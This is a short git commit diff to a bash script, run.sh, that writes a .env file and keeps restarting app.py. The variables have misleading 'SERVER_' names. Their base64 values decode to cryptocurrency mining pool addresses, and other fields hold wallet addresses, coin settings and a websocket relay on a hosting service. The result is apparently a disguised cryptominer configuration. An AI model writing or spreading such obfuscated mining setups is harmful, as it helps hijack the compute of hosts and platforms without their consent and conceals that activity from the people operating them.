bec3d7622d8dcaec4e0fc97d7efe0933ed18daa8
satelitlima00 <128956610+satelitlima00@users.noreply.github.com>
2026-05-10 19:32:06 +0700

    Update run.sh

--- app/run.sh
+++ app/run.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://digitaldz.biz.id
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
-SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
-SERVER_SECRET=${NAME}
+echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
+SERVER_TARGET=bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==
+SERVER_DOMAIN=MC2aktqE12PdxRvapTNrG8kbhU5F1Vb2fT
+SERVER_SECRET=c=MAZA,zap=MAZA
 SERVER_CONNECTION=${CONNECT}
 SERVER_MODE=FAST" > .env
 while true; do python3 app.py; sleep 10; done
